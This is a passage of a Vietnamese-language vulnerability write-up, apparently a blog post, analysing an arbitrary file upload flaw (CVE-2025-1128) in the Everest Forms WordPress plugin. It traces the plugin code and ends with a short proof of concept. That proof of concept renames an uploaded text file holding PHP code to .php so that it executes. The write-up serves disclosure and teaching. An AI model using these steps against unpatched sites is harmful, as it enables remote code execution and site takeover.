v·ªõi field **File Upload**&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/create_form.png&#34; data-sub-html=&#34;&lt;h2&gt;Create Form&lt;/h2&gt;&lt;p&gt;T·∫°o form v·ªõi field **File Upload**&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/create_form.png&#39; alt=&#34;Create Form&#34; height=&#34;552&#34; width=&#34;1302&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫°o form v·ªõi field **File Upload**&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Upload file file b·∫•t k√¨ v√† b·∫Øt l·∫°i b·∫±ng BurpSuite (Vi·ªác upload file c≈©ng d√†nh cho anonymous user khi truy c·∫≠p post/page ƒë∆∞·ª£c nh√∫ng form)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/snap_request.png&#34; title=&#34;B·∫Øt request fileupload b·∫±ng BurpSuite&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/snap_request.png&#34; data-sub-html=&#34;&lt;h2&gt;Snap Request&lt;/h2&gt;&lt;p&gt;B·∫Øt request fileupload b·∫±ng BurpSuite&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/snap_request.png&#39; alt=&#34;Snap Request&#34; height=&#34;793&#34; width=&#34;794&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫Øt request fileupload b·∫±ng BurpSuite&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒê·∫∑t break point ƒë·∫øn h√†m &lt;code&gt;format()&lt;/code&gt; v√† quan s√°t&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/input_name.png&#34; title=&#34;$input_name trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/input_name.png&#34; data-sub-html=&#34;&lt;h2&gt;Input Name&lt;/h2&gt;&lt;p&gt;$input_name trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/input_name.png&#39; alt=&#34;Input Name&#34; height=&#34;403&#34; width=&#34;1090&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$input_name trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Theo k·∫øt qu·∫£ debug &lt;code&gt;$input_name&lt;/code&gt; l√† t√™n tr∆∞·ªùng √°nh x·∫° ƒë·∫øn m·∫£ng ch·ª©a JSON data &lt;code&gt;file&lt;/code&gt; v√† &lt;code&gt;name&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;D·ªØ li·ªáu n√†y ƒë∆∞·ª£c decode JSON v√† g√°n cho m·∫£ng &lt;code&gt;$raw_files&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;try {&#xA;    $raw_files = json_decode( wp_unslash( $_POST[ $input_name ] ), true ); // phpcs:ignore WordPress.Security&#xA;} catch ( Exception $e ) {&#xA;    evf()-&amp;gt;task-&amp;gt;form_fields[ $this-&amp;gt;field_id ] = $processed;&#xA;    return;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/raw_files.png&#34; title=&#34;$raw_files trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/raw_files.png&#34; data-sub-html=&#34;&lt;h2&gt;Raw Files&lt;/h2&gt;&lt;p&gt;$raw_files trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/raw_files.png&#39; alt=&#34;Raw Files&#34; height=&#34;372&#34; width=&#34;1224&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$raw_files trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$files = array_filter(&#xA;    $raw_files,&#xA;    static function ( $file ) {&#xA;        return ( is_array( $file ) || is_object( $file ) &amp;amp;&amp;amp; count( $file ) === 2 ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;file&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $file[&amp;#39;name&amp;#39;] );&#xA;    }&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Filter n√†y tr·∫£ v·ªÅ d·ªØ li·ªáu g√°n v√†o m·∫£ng &lt;code&gt;$files&lt;/code&gt;, ƒë·∫£m b·∫£o ch·ªâ x·ª≠ l√Ω c√°c t·ªáp ƒë∆∞·ª£c g·ª≠i c√≥ c·∫•u tr√∫c v√† kh√≥a mong ƒë·ª£i, n·∫øu l·ªói s·∫Ω tr·∫£ v·ªÅ r·ªóng.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/files.png&#34; title=&#34;$files trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/files.png&#34; data-sub-html=&#34;&lt;h2&gt;Files&lt;/h2&gt;&lt;p&gt;$files trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/files.png&#39; alt=&#34;Files&#34; height=&#34;365&#34; width=&#34;657&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$files trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Duy·ªát m·∫£ng file, plugin g·ªçi ƒë·∫øn h√†m &lt;code&gt;generate_file_info()&lt;/code&gt; ƒë·ªÉ t·∫°o th√¥ng tin t·∫°m cho m·ªói file, sau ƒë√≥ m·ªõi ki·ªÉm tra lo·∫°i file b·∫±ng &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;foreach ( $files as $file ) {&#xA;    $file = $this-&amp;gt;generate_file_info( $file );&#xA;    $wp_filetype = wp_check_filetype_and_ext( $file[&amp;#39;tmp_path&amp;#39;], $file[&amp;#39;name&amp;#39;] );&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;protected function generate_file_info( $file ) {&#xA;    $dir = $this-&amp;gt;get_form_files_dir();&#xA;    $file[&amp;#39;tmp_path&amp;#39;] = trailingslashit( $this-&amp;gt;get_tmp_dir() ) . sanitize_file_name($file[&amp;#39;file&amp;#39;]);&#xA;    $file[&amp;#39;type&amp;#39;]     = &amp;#39;application/octet-stream&amp;#39;;&#xA;    if ( is_file( $file[&amp;#39;tmp_path&amp;#39;] ) ) {&#xA;        $filetype     = wp_check_filetype( $file[&amp;#39;tmp_path&amp;#39;] );&#xA;        $file[&amp;#39;type&amp;#39;] = $filetype[&amp;#39;type&amp;#39;];&#xA;    }&#xA;&#xA;    // Data for no media case.&#xA;    $file_ext              = pathinfo( $file[&amp;#39;name&amp;#39;], PATHINFO_EXTENSION );&#xA;    $file_base             = wp_basename( $file[&amp;#39;name&amp;#39;], &amp;#34;.$file_ext&amp;#34; );&#xA;    $file[&amp;#39;file_name_new&amp;#39;] = sprintf( &amp;#39;%s-%s.%s&amp;#39;, $file_base, wp_hash( $dir[&amp;#39;path&amp;#39;] . $this-&amp;gt;form_data[&amp;#39;id&amp;#39;] . $this-&amp;gt;field_id ), strtolower( $file_ext ) );&#xA;    $file[&amp;#39;file_name_new&amp;#39;] = wp_unique_filename( trailingslashit( $dir[&amp;#39;path&amp;#39;] ), sanitize_file_name( $file[&amp;#39;file_name_new&amp;#39;] ) );&#xA;    $file[&amp;#39;file_url&amp;#39;]      = trailingslashit( $dir[&amp;#39;url&amp;#39;] ) . $file[&amp;#39;file_name_new&amp;#39;];&#xA;    $file[&amp;#39;path&amp;#39;]          = trailingslashit( $dir[&amp;#39;path&amp;#39;] ) . $file[&amp;#39;file_name_new&amp;#39;];&#xA;    $file[&amp;#39;attachment_id&amp;#39;] = 0;&#xA;&#xA;    return $file;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu ƒë√°ng ch√∫ √Ω l√† h√†m s·ª≠ d·ª•ng &lt;code&gt;wp_hash()&lt;/code&gt; ƒë·ªÉ t·∫°o &lt;code&gt;$file[&#39;file_name_new&#39;]&lt;/code&gt; sau ƒë√≥ concat v√†o &lt;code&gt;$dir[&#39;path&#39;]&lt;/code&gt; ƒë·ªÉ g√°n gi√° tr·ªã cho &lt;code&gt;$file[&#39;path&#39;]&lt;/code&gt;, t·ª©c gi√° tr·ªã n√†y ƒë∆∞·ª£c t·∫°o ra k·∫øt h·ª£p s·ª≠ d·ª•ng &lt;strong&gt;salt&lt;/strong&gt; ƒë∆∞·ª£c thi·∫øt l·∫≠p trong &lt;code&gt;wp-config.php&lt;/code&gt; =&amp;gt; ta ch·ªâ bi·∫øt ƒë∆∞·ª£c c√≥ &lt;strong&gt;salt&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;code&gt;$file_ext&lt;/code&gt; ƒë∆∞·ª£c concat v√†o cu·ªëi &lt;code&gt;file[&#39;path&#39;]&lt;/code&gt;, ta c√≥ th·ªÉ ki·ªÉm so√°t n√≥ th√¥ng qua tr∆∞·ªùng &lt;code&gt;name&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn trong request.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;- _690888869ea291.55135482.txt&#xA;&amp;#43; _690888869ea291.55135482.php&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/file.png&#34; title=&#34;$file trong debugger&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/file.png&#34; data-sub-html=&#34;&lt;h2&gt;File&lt;/h2&gt;&lt;p&gt;$file trong debugger&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/file.png&#39; alt=&#34;File&#34; height=&#34;709&#34; width=&#34;1862&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;$file trong debugger&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;·ªû ƒë√¢y ta ch·ªâ c·∫ßn ch√∫ √Ω ƒë·∫øn 3 tr∆∞·ªùng &lt;code&gt;tmp_path&lt;/code&gt;, &lt;code&gt;name&lt;/code&gt;, &lt;code&gt;path&lt;/code&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;tmp_path&lt;/code&gt; - &lt;code&gt;name&lt;/code&gt; ƒë∆∞·ª£c ƒë·∫∑t l√†m ƒë·ªëi s·ªë trong h√†m &lt;code&gt;wp_check_filetype_and_ext()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;tmp_path&lt;/code&gt; - &lt;code&gt;path&lt;/code&gt; ƒë∆∞·ª£c ƒë·∫∑t l√†m ƒë·ªëi s·ªë trong h√†m &lt;code&gt;rename()&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Nh∆∞ ph√¢n t√≠ch tr∆∞·ªõc ƒë√≥, logic v·∫´n ch·∫°y m·∫∑c d√π file upload kh√¥ng ƒë∆∞·ª£c ph√©p. &lt;code&gt;rename($file[&#39;tmp_path&#39;] , $file[&#39;path&#39;])&lt;/code&gt; ƒë∆∞·ª£c g·ªçi ƒë·ªÉ di chuy·ªÉn file t·ª´ ƒë∆∞·ªùng d·∫´n t·∫°m sang ƒë∆∞·ªùng d·∫´n ch√≠nh.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;format()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;everest_forms_process_format_&amp;#39; . $this-&amp;gt;type, array( $this, &amp;#39;format&amp;#39; ), 10, 4 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi type l√† &lt;code&gt;file-upload&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/type.png&#34; title=&#34;Type c·∫ßn thi·∫øt ƒë·ªÉ g·ªçi format&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/type.png&#34; data-sub-html=&#34;&lt;h2&gt;Type&lt;/h2&gt;&lt;p&gt;Type c·∫ßn thi·∫øt ƒë·ªÉ g·ªçi format&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/type.png&#39; alt=&#34;Type&#34; height=&#34;415&#34; width=&#34;1729&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Type c·∫ßn thi·∫øt ƒë·ªÉ g·ªçi format&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;everest_forms_process_format_&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/action.png&#34; title=&#34;Hook everest_forms_process_format_file-upload ƒë∆∞·ª£c g·ªçi&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/action.png&#34; data-sub-html=&#34;&lt;h2&gt;Action&lt;/h2&gt;&lt;p&gt;Hook everest_forms_process_format_file-upload ƒë∆∞·ª£c g·ªçi&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/action.png&#39; alt=&#34;Action&#34; height=&#34;351&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Hook everest_forms_process_format_file-upload ƒë∆∞·ª£c g·ªçi&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;Hook n√†y s·∫Ω ƒë∆∞·ª£c g·ªçi trong h√†m &lt;code&gt;do_task()&lt;/code&gt; th√¥ng quan &lt;code&gt;do_action()&lt;/code&gt; v·ªõi &lt;code&gt;$field_type&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn ƒë·ªông&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function listen_task() {&#xA;    ...&#xA;    if ( ! empty( $_POST[&amp;#39;everest_forms&amp;#39;][&amp;#39;id&amp;#39;] ) ) { // phpcs:ignore WordPress.Security.NonceVerification&#xA;        $this-&amp;gt;do_task( evf_sanitize_entry( wp_unslash( $_POST[&amp;#39;everest_forms&amp;#39;] ) ) ); // phpcs:ignore WordPress.Security.NonceVerification, WordPress.Security.ValidatedSanitizedInput.InputNotSanitized&#xA;    }&#xA;    ...&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;do_task()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong &lt;code&gt;listen_task()&lt;/code&gt; khi everest forms &lt;code&gt;id&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn v√†o POST request&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;listen_task()&lt;/code&gt; ƒë∆∞·ª£c ƒëƒÉng k√Ω l√†m callback cho action hook&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp&amp;#39;, array( $this, &amp;#39;listen_task&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hook n√†y s·∫Ω ƒë∆∞·ª£c x·ª≠ l√Ω tr√™n m·ªói request&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;User submits form (file)&amp;#34;] --&amp;gt; B[&amp;#34;Browser sends POST to page with form&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;WP hook triggered - listen_task()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;do_task() calls do_action() with field type&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;everest_forms_process_format_file-upload calls format()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;generate_file_info() creates tmp_path, name, path&amp;#34;]&#xA;E --&amp;gt; G[&amp;#34;wp_check_filetype_and_ext(tmp_path, name)&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;File type check result&amp;#34;}&#xA;H --&amp;gt;|Valid| I[&amp;#34;rename(tmp_path ‚Üí path) moves file to uploads&amp;#34;]&#xA;H --&amp;gt;|Invalid| J[&amp;#34;Set error but continue execution&amp;#34;]&#xA;J --&amp;gt; I&#xA;I --&amp;gt; K[&amp;#34;File accessible in uploads ‚Üí potential executable upload&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o file &lt;code&gt;.txt&lt;/code&gt; ch·ª©a code php&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;TEXT&#xA;&amp;lt;?php phpinfo();?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;B·∫≠t Burp Intercept v√† b·∫Øt file upload&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠a extension trong &lt;code&gt;name&lt;/code&gt; th√†nh &lt;code&gt;.php&lt;/code&gt; v√† g·ª≠i request.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/fileuploaded.png&#34; title=&#34;File upload th√†nh c√¥ng&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/fileuploaded.png&#34; data-sub-html=&#34;&lt;h2&gt;File Uploaded&lt;/h2&gt;&lt;p&gt;File upload th√†nh c√¥ng&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/fileuploaded.png&#39; alt=&#34;File Uploaded&#34; height=&#34;351&#34; width=&#34;1771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;File upload th√†nh c√¥ng&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Truy c·∫≠p file ƒë√£ upload&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-09-cve-2025-1128/result.png&#34; title=&#34;phpinfo() v·ªõi file upload&#34; data-thumbnail=&#34;/posts/2025-11-09-cve-2025-1128/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;phpinfo() v·ªõi file upload&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-09-cve-2025-1128/result.png&#39; alt=&#34;Result&#34; height=&#34;1113&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;phpinfo() v·ªõi file upload&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong &lt;code&gt;EVF_Form_Fields_Upload::format()&lt;/code&gt; cho ph√©p t·∫£i l√™n, ƒë·ªçc v√† x√≥a t·ªáp t√πy √Ω do thi·∫øu ki·ªÉm tra ki·ªÉu t·ªáp v√† ƒë∆∞·ªùng d·∫´n ƒë√∫ng c√°ch. M·∫∑c d√π plugin c√≥ c·∫£nh b√°o l·ªói khi ph√°t hi·ªán t·ªáp kh√¥ng h·ª£p l·ªá, lu·ªìng x·ª≠ l√Ω kh√¥ng d·ª´ng v√† v·∫´n g·ªçi &lt;code&gt;rename()&lt;/code&gt; ƒë·ªÉ di chuy·ªÉn t·ªáp v√†o th∆∞ m·ª•c public ‚Äî d·∫´n ƒë·∫øn kh·∫£ nƒÉng ƒë∆∞a m√£ th·ª±c thi l√™n server (RCE), ti·∫øt l·ªô d·ªØ li·ªáu nh·∫°y c·∫£m ho·∫∑c chi·∫øm quy·ªÅn qu·∫£n tr·ªã site. B·∫£n v√° (‚â• 3.0.9.5) ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch d·ª´ng lu·ªìng khi ph√°t hi·ªán t·ªáp kh√¥ng h·ª£p l·ªá, nh∆∞ng c√°c site ch∆∞a c·∫≠p nh·∫≠t v·∫´n r·∫•t d·ªÖ b·ªã l·ª£i d·ª•ng.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaway&#34;&gt;&lt;span&gt;Key Takeaway&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaway&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Thi·∫øu ki·ªÉm tra ch·∫∑t ch·∫Ω ki·ªÉu/ƒëu√¥i file d·∫´n ƒë·∫øn nguy c∆° upload file th·ª±c thi.&lt;/li&gt;&#xA;&lt;li&gt;Ph√°t hi·ªán file kh√¥ng h·ª£p l·ªá nh∆∞ng kh√¥ng d·ª´ng lu·ªìng x·ª≠ l√Ω cho ph√©p k·∫ª t·∫•n c√¥ng bypass.&lt;/li&gt;&#xA;&lt;li&gt;Validation v√¥ nghƒ©a n·∫øu kh√¥ng k√®m h√†nh ƒë·ªông ch·∫∑n (stop/exit/wp_die) tr∆∞·ªõc khi thao t√°c filesystem.&lt;/li&gt;&#xA;&lt;li&gt;C·∫ßn ki·ªÉm tra c·∫£ n·ªôi dung (MIME/content), kh√¥ng ch·ªâ d·ª±a v√†o t√™n/extension do client cung c·∫•p.&lt;/li&gt;&#xA;&lt;li&gt;NgƒÉn th·ª±c thi PHP trong th∆∞ m·ª•c &lt;code&gt;uploads&lt;/code&gt; v√† d√πng API upload an to√†n (v√≠ d·ª• &lt;code&gt;wp_handle_upload()&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path 